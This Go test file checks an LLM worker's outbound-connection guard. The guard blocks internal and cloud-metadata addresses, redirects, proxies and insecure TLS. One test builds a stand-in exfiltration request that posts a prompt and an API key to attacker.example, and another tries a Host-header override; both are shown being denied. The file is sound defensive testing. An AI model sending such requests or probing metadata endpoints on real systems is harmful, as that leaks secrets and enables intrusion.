package runtime

import (
	"context"
	"crypto/tls"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	goruntime "runtime"
	"strings"
	"testing"
	"time"

	"github.com/mfow/llm-temporal-worker/config"
)

func TestProviderEgressPolicyRejectsBlockedAddresses(t *testing.T) {
	t.Parallel()

	cases := map[string]string{
		"ipv4 loopback":        "127.0.0.1",
		"ipv4 private":         "10.0.0.1",
		"ipv4 link local":      "169.254.169.254",
		"ipv4 multicast":       "224.0.0.1",
		"ipv4 unspecified":     "0.0.0.0",
		"ipv4 carrier grade":   "100.64.0.1",
		"azure metadata":       "168.63.129.16",
		"ipv6 loopback":        "::1",
		"ipv6 private":         "fd00:ec2::254",
		"ipv6 link local":      "fe80::1",
		"ipv6 multicast":       "ff02::1",
		"ipv6 unspecified":     "::",
		"ipv4 mapped loopback": "::ffff:127.0.0.1",
	}
	for name, address := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			policy, err := newProviderEgressPolicy(providerEgressEndpoint(), &egressTestResolver{addresses: []net.IPAddr{{IP: net.ParseIP(address)}}}, nil, time.Second)
			if err != nil {
				t.Fatalf("newProviderEgressPolicy() error = %v", err)
			}
			_, err = policy.DialContext(context.Background(), "tcp", "provider.example:443")
			if !errors.Is(err, ErrProviderEgressDenied) {
				t.Fatalf("DialContext() error = %v, want ErrProviderEgressDenied", err)
			}
			if strings.Contains(err.Error(), address) {
				t.Fatalf("DialContext() leaked blocked address: %q", err)
			}
		})
	}
}

func TestProviderEgressPolicyDialsResolvedPublicAddressAndRechecksConnection(t *testing.T) {
	t.Parallel()

	const publicAddress = "8.8.8.8"
	var dialed string
	policy, err := newProviderEgressPolicy(providerEgressEndpoint(), &egressTestResolver{addresses: []net.IPAddr{{IP: net.ParseIP(publicAddress)}}}, func(_ context.Context, _ string, address string) (net.Conn, error) {
		dialed = address
		return newEgressTestConn(net.ParseIP(publicAddress)), nil
	}, time.Second)
	if err != nil {
		t.Fatal(err)
	}
	connection, err := policy.DialContext(context.Background(), "tcp", "provider.example:443")
	if err != nil {
		t.Fatalf("DialContext() error = %v", err)
	}
	firstConnection := connection
	t.Cleanup(func() { _ = firstConnection.Close() })
	if got, want := dialed, "8.8.8.8:443"; got != want {
		t.Fatalf("dial target = %q, want resolved address %q", got, want)
	}

	policy, err = newProviderEgressPolicy(providerEgressEndpoint(), &egressTestResolver{addresses: []net.IPAddr{{IP: net.ParseIP(publicAddress)}}}, func(context.Context, string, string) (net.Conn, error) {
		return newEgressTestConn(net.ParseIP("169.254.169.254")), nil
	}, time.Second)
	if err != nil {
		t.Fatal(err)
	}
	connection, err = policy.DialContext(context.Background(), "tcp", "provider.example:443")
	if connection != nil {
		_ = connection.Close()
		t.Fatal("DialContext() returned a connection after its remote address changed")
	}
	if !errors.Is(err, ErrProviderEgressDenied) {
		t.Fatalf("DialContext() error = %v, want ErrProviderEgressDenied", err)
	}
	if strings.Contains(err.Error(), "169.254.169.254") {
		t.Fatalf("DialContext() leaked rechecked address: %q", err)
	}
}

func TestProviderEgressPolicyUsesOnlyConfiguredBasePort(t *testing.T) {
	t.Parallel()

	endpoint := providerEgressEndpoint()
	endpoint.BaseURL = "https://provider.example:8443/v1"
	policy, err := newProviderEgressPolicy(endpoint, &egressTestResolver{addresses: []net.IPAddr{{IP: net.ParseIP("8.8.8.8")}}}, func(_ context.Context, _ string, address string) (net.Conn, error) {
		if got, want := address, "8.8.8.8:8443"; got != want {
			t.Fatalf("dial target = %q, want %q", got, want)
		}
		return newEgressTestConn(net.ParseIP("8.8.8.8")), nil
	}, time.Second)
	if err != nil {
		t.Fatal(err)
	}
	_, err = policy.DialContext(context.Background(), "tcp", "provider.example:443")
	if !errors.Is(err, ErrProviderEgressDenied) {
		t.Fatalf("DialContext() unconfigured port error = %v, want ErrProviderEgressDenied", err)
	}
	connection, err := policy.DialContext(context.Background(), "tcp", "provider.example:8443")
	if err != nil {
		t.Fatalf("DialContext() configured port error = %v", err)
	}
	t.Cleanup(func() { _ = connection.Close() })
}

func TestProviderEgressPolicyBoundsDNSResolution(t *testing.T) {
	t.Parallel()

	resolver := &blockingEgressResolver{started: make(chan struct{})}
	policy, err := newProviderEgressPolicy(providerEgressEndpoint(), resolver, nil, 25*time.Millisecond)
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	_, err = policy.DialContext(context.Background(), "tcp", "provider.example:443")
	if !errors.Is(err, ErrProviderEgressDenied) {
		t.Fatalf("DialContext() error = %v, want ErrProviderEgressDenied", err)
	}
	if elapsed := time.Since(start); elapsed > 500*time.Millisecond {
		t.Fatalf("DNS resolution exceeded the bounded connect timeout: %s", elapsed)
	}
	select {
	case <-resolver.started:
	default:
		t.Fatal("resolver was not called")
	}
}

func TestLocalProviderMockPolicyRemainsFailClosed(t *testing.T) {
	t.Parallel()

	endpoint := localProviderMockEndpoint(t)
	policy, err := newProviderEgressPolicy(endpoint, &egressTestResolver{addresses: []net.IPAddr{{IP: net.ParseIP("172.20.0.10")}}}, nil, time.Second)
	if err != nil {
		t.Fatalf("newProviderEgressPolicy() error = %v", err)
	}
	_, err = policy.DialContext(context.Background(), "tcp", "provider-mock:8081")
	if !errors.Is(err, ErrProviderEgressDenied) {
		t.Fatalf("local provider mock DialContext() error = %v, want ErrProviderEgressDenied", err)
	}
	if strings.Contains(err.Error(), "172.20.0.10") {
		t.Fatalf("local provider mock error leaked Docker address: %q", err)
	}
}

func TestProviderEgressTransportRejectsArbitraryRequestURL(t *testing.T) {
	t.Parallel()

	resolver := &egressTestResolver{addresses: []net.IPAddr{{IP: net.ParseIP("8.8.8.8")}}}
	client, err := newProviderEgressHTTPClient(&http.Client{}, providerEgressEndpoint(), resolver, nil)
	if err != nil {
		t.Fatal(err)
	}
	request, err := http.NewRequest(http.MethodPost, "https://attacker.example/continuation-secret", strings.NewReader("prompt-secret"))
	if err != nil {
		t.Fatal(err)
	}
	request.Header.Set("Authorization", "Bearer api-key-secret")
	_, err = client.Transport.RoundTrip(request)
	if !errors.Is(err, ErrProviderEgressDenied) {
		t.Fatalf("RoundTrip() error = %v, want ErrProviderEgressDenied", err)
	}
	for _, secret := range []string{"attacker.example", "continuation-secret", "prompt-secret", "api-key-secret"} {
		if strings.Contains(err.Error(), secret) {
			t.Fatalf("RoundTrip() leaked %q in %q", secret, err)
		}
	}
	if resolver.lookups != 0 {
		t.Fatalf("resolver calls = %d, want no lookup for an unconfigured host", resolver.lookups)
	}

	hostOverride, err := http.NewRequest(http.MethodGet, "https://provider.example/v1", nil)
	if err != nil {
		t.Fatal(err)
	}
	hostOverride.Host = "attacker.example"
	_, err = client.Transport.RoundTrip(hostOverride)
	if !errors.Is(err, ErrProviderEgressDenied) {
		t.Fatalf("RoundTrip() host override error = %v, want ErrProviderEgressDenied", err)
	}
	if strings.Contains(err.Error(), "attacker.example") {
		t.Fatalf("RoundTrip() leaked host override in %q", err)
	}
	if resolver.lookups != 0 {
		t.Fatalf("resolver calls = %d, want no lookup for a host override", resolver.lookups)
	}
}

func TestProviderEgressTransportDisablesRedirectsAndKeepsTLS(t *testing.T) {
	t.Parallel()

	redirects := 0
	server := httptest.NewTLSServer(http.HandlerFunc(func(response http.ResponseWriter, request *http.Request) {
		redirects++
		if request.URL.Path == "/redirect" {
			http.Redirect(response, request, "https://provider.example/final", http.StatusFound)
			return
		}
		_, _ = io.WriteString(response, "ok")
	}))
	t.Cleanup(server.Close)

	base := server.Client()
	transport, ok := base.Transport.(*http.Transport)
	if !ok {
		t.Fatalf("TLS mock transport = %T, want *http.Transport", base.Transport)
	}
	trustedTransport := transport.Clone()
	if trustedTransport.TLSClientConfig == nil {
		t.Fatal("TLS mock transport is missing trusted test roots")
	}
	trustedTLS := trustedTransport.TLSClientConfig.Clone()
	trustedTLS.ServerName = "example.com"
	trustedTransport.TLSClientConfig = trustedTLS
	base = &http.Client{Transport: trustedTransport}
	endpoint := providerEgressEndpoint()
	endpoint.BaseURL = "https://example.com/v1"
	endpoint.OutboundHosts = []string{"example.com"}

	client, err := newProviderEgressHTTPClient(base, endpoint, &egressTestResolver{addresses: []net.IPAddr{{IP: net.ParseIP("8.8.8.8")}}}, func(ctx context.Context, network, address string) (net.Conn, error) {
		connection, err := (&net.Dialer{}).DialContext(ctx, network, server.Listener.Addr().String())
		if err != nil {
			return nil, err
		}
		return egressTestConn{Conn: connection, remote: &net.TCPAddr{IP: net.ParseIP("8.8.8.8"), Port: 443}}, nil
	})
	if err != nil {
		t.Fatal(err)
	}
	response, err := client.Get("https://example.com/redirect")
	if err != nil {
		t.Fatalf("GET through TLS mock: %v", err)
	}
	t.Cleanup(func() { _ = response.Body.Close() })
	if got, want := response.StatusCode, http.StatusFound; got != want {
		t.Fatalf("response status = %d, want redirect response %d", got, want)
	}
	if redirects != 1 {
		t.Fatalf("TLS mock requests = %d, want 1 without redirect follow", redirects)
	}
}

func TestProviderEgressTransportRejectsInsecureTLSVerification(t *testing.T) {
	t.Parallel()

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} //nolint:gosec // regression test for rejecting unsafe caller transport.
	_, err := newProviderEgressHTTPClient(&http.Client{Transport: transport}, providerEgressEndpoint(), nil, nil)
	if !errors.Is(err, ErrProviderEgressDenied) {
		t.Fatalf("newProviderEgressHTTPClient() error = %v, want ErrProviderEgressDenied", err)
	}
	if got, want := err.Error(), "provider egress blocked: invalid_transport"; got != want {
		t.Fatalf("newProviderEgressHTTPClient() error = %q, want %q", got, want)
	}
}

func TestProviderEgressTransportBoundsConnectAndReadTimeouts(t *testing.T) {
	t.Parallel()

	endpoint := providerEgressEndpoint()
	endpoint.Timeout = config.Duration(20 * time.Second)
	baseTransport := http.DefaultTransport.(*http.Transport).Clone()
	baseTransport.Proxy = http.ProxyFromEnvironment
	baseTransport.DialTLSContext = func(context.Context, string, string) (net.Conn, error) {
		return nil, errors.New("must not bypass egress dial policy")
	}
	baseTransport.DialTLS = func(string, string) (net.Conn, error) { return nil, errors.New("must not bypass egress dial policy") }
	client, err := newProviderEgressHTTPClient(&http.Client{Transport: baseTransport}, endpoint, &egressTestResolver{addresses: []net.IPAddr{{IP: net.ParseIP("8.8.8.8")}}}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if got, want := client.Timeout, 20*time.Second; got != want {
		t.Fatalf("client timeout = %s, want %s", got, want)
	}
	guard, ok := client.Transport.(*providerEgressRoundTripper)
	if !ok {
		t.Fatalf("client transport = %T, want provider egress guard", client.Transport)
	}
	transport, ok := guard.next.(*http.Transport)
	if !ok {
		t.Fatalf("guard next transport = %T, want *http.Transport", guard.next)
	}
	if got, want := transport.TLSHandshakeTimeout, 10*time.Second; got != want {
		t.Fatalf("TLS handshake timeout = %s, want %s", got, want)
	}
	if got, want := transport.ResponseHeaderTimeout, 20*time.Second; got != want {
		t.Fatalf("response header timeout = %s, want %s", got, want)
	}
	if transport.Proxy != nil || transport.DialTLSContext != nil || transport.DialTLS != nil {
		t.Fatal("egress transport retained a proxy or TLS dial bypass")
	}
}

func providerEgressEndpoint() config.EndpointConfig {
	return config.EndpointConfig{
		BaseURL:       "https://provider.example/v1",
		OutboundHosts: []string{"PROVIDER.EXAMPLE."},
		Timeout:       config.Duration(30 * time.Second),
	}
}

type egressTestResolver struct {
	addresses []net.IPAddr
	lookups   int
}

func (resolver *egressTestResolver) LookupIPAddr(context.Context, string) ([]net.IPAddr, error) {
	resolver.lookups++
	return append([]net.IPAddr(nil), resolver.addresses...), nil
}

type blockingEgressResolver struct {
	started chan struct{}
}

func (resolver *blockingEgressResolver) LookupIPAddr(ctx context.Context, _ string) ([]net.IPAddr, error) {
	close(resolver.started)
	<-ctx.Done()
	return nil, ctx.Err()
}

type egressTestConn struct {
	net.Conn
	remote net.Addr
}

func (connection egressTestConn) RemoteAddr() net.Addr { return connection.remote }

func newEgressTestConn(remote net.IP) net.Conn {
	client, server := net.Pipe()
	go func() { _ = server.Close() }()
	return egressTestConn{Conn: client, remote: &net.TCPAddr{IP: remote, Port: 443}}
}

func localProviderMockEndpoint(t *testing.T) config.EndpointConfig {
	t.Helper()
	_, source, _, ok := goruntime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	data, err := os.ReadFile(filepath.Join(filepath.Dir(source), "..", "..", "deploy", "local", "config.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	loaded, err := config.Load(data)
	if err != nil {
		t.Fatalf("load local config: %v", err)
	}
	endpoint, ok := loaded.Endpoints["provider-mock"]
	if !ok {
		t.Fatal("local config is missing provider-mock endpoint")
	}
	return endpoint
}
